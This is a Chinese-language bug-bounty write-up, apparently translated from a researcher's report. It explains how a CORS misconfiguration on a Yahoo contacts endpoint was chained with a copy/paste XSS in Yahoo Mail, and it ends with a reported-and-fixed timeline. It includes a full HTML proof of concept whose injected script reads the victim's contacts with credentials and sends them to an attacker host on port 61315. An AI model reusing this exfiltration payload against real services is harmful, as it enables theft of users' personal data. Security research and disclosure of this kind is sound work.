@@ -1,0 +1,17 @@
+*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。
+前段时间，我利用了XSS和CORS错误配置两个漏洞实现了对雅虎邮箱用户的通讯录信息窃取，这些相关信息包括：受害者姓名、电话号码和住址等。在此，我来详细说说整个过程。
+跨域资源共享CORS 跨域资源共享（CORS）策略是一种利用附加HTTP头标记，让用户代理获得不同域服务器上对特定资源访问权限的机制。但出于保护用户信息安全的目的，大多浏览器都会实施“同源策略”（Same Origin Policy）机制，所谓“同源策略”指的是不同源的客户端脚本在没有明确授权情况下，不允许读写对方的资源，也即网站上的数据只允许相同域名和端口访问。因此，配置了跨域资源共享（CORS）策略之后，就能实现跨域数据访问。 跨站脚本漏洞XSS(Cross Site Scripting) XSS一种客户端代码注入方式，利用这种方式可在有漏洞的应用中注入如javascript等运行脚本，实现恶意目的。
+研究人员用Burp Suite对*.yahoo.com子域名的不同请求进行了分析，发现一个很有趣的子域名proddata.xobni.yahoo.com，记录的请求很少，但是都是请求的endpoint都相同——https://proddata.xobni.yahoo.com/v4/contacts。该endpoint含有联系人目录中的每一个联系人，而且带有Access-Control-Allow-Credentials: true的源https://mail.yahoo.com被反射回Access-Control-Allow-Origin。研究人员尝试修改origin为不同的payload但是并没有效果，因此研究人员用一个雅虎的子域名替换了该payload。
+我利用Burp Suite对*.yahoo.com子域名进行了枚举之后，发现了一个有意思的域名- proddata.xobni.yahoo.com，虽然该域名涉及的请求不多，但都指向了同一个服务端：https://proddata.xobni.yahoo.com/v4/contacts，该服务端中包含了利用GET请求测试的所有通讯录联系人信息。
+我注意服务端响应中包含了Access-Control-Allow-Origin源为https://mail.yahoo.com，且Access-Control-Allow-Credentials: true的头信息，由此，我尝试对Access-Control-Allow-Origin源作出一些修改访问，但可惜一个都成功，之后，我试着把其更改为与mail.yahoo.com不同的其它雅虎子域名。如下：
+得到的响应为：
+从上述信息可知，它可以接受任何*.yahoo.com子域名为源，且Access-Control-Allow-Credentials为true，这也说是说，如果在*.yahoo.com中发现了XSS漏洞，那么就可以利用这种CORS错误配置漏洞来窃取用户的通讯录信息了。Access-Control-Allow-Credentials 头指定了当浏览器的credentials设置为true时是否允许浏览器读取response的内容，具体参考：developer.mozilla
+漏洞2: 雅虎邮箱（Yahoo! Mail）服务的XSS漏洞
+现在，寻找雅虎XSS漏洞成了关键，但遗憾的是，经过好多天的尝试分析，我也没有发现一个有效的XSS。之后，通过Twitter发贴信息，我发现安全研究人员Enguerran Gillier (@opnsec) 发现了一个雅虎邮箱相关且暂不修复（wontfix）的复制粘贴型XSS漏洞。于是乎，我马上通过其给出的POC信息，结合漏洞1作出了一些测试分析。尽管最终利用方式存在一些用户交互条件，但不管这么多了，只要证明漏洞存在就好。（PS：后来通过向雅虎提交了漏洞我才发现，由于Enguerran Gillier与Yahoo方面存在一些沟通问题，所以才导致该XSS漏洞被Yahoo方面标记为暂不修复（wontfix）状态，我是有多幸运啊！）
+最终利用方式（PoC）
+以下为我的最终PoC，需要受害者用户登录雅虎邮箱，之后复制以下页面中的任意信息，然后粘贴到新建发信正文中，此后，受害者用户雅虎邮箱中的所有通讯录信息就会通过61315端口自动发送到我的控制端中：
+<!doctype html> <head> <title>Yahoo CORS Misconfiguration</title> </head> <body> <h1>Yahoo CORS Misconfiguration</h1> <p>Stealing Contact information via CORS Misconfiguration + Yahoo Mail XSS via Copy/Paste</p> <h3>Prerequisites :</h3> - Tested on Windows 10 with Firefox 56, Chrome 62, Edge<br/> <h3>Instructions :</h3> 1. Select any text in this page and copy it using ctrl-C or right click -> copy <br/> <span>Copy status : </span><span id="copied">not copied yet</span> <br/> 2. Go to Yahoo Mail, compose a new email and paste inside the email body<br/> 3. All of your contact's information will be sent to my server on port 61315 <script> document.addEventListener('copy', function(e){ e.clipboardData.setData('text/plain', ''); e.clipboardData.setData('text/html','<div id="enhancr2_a" class="yahoo-link-enhancr-card">xxx</div><img src="x" onerror="document.write(\'&lt;script&gt;var xhttp=new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {document.location=&#x22;http://example.com:61315&#x22;+escape(this.responseText);}};xhttp.open(&#x22;GET&#x22;,&#x22;https://proddata.xobni.yahoo.com/v4/contacts&#x22;,true);xhttp.withCredentials = true;xhttp.send();&lt;/script&gt;\');">'); e.preventDefault(); document.getElementById("copied").textContent = "SUCCESSFULLY COPIED" }); </script>
+视频: https://www.youtube.com/embed/lK23tBEVKxU
+漏洞报送进程
+2017.11.8 通过HackerOne向雅虎报送漏洞 2017.11.9 雅虎初次确认分类并发放前期$150美金奖励 2017.11.15 雅虎方面修复漏洞 2017.12.10 雅虎方面又向我发放了$1,850美金后期奖励（共$2000美金）
+*参考来源：sxcurity，freebuf小编clouds编译，转载请注明来自FreeBuf.COM
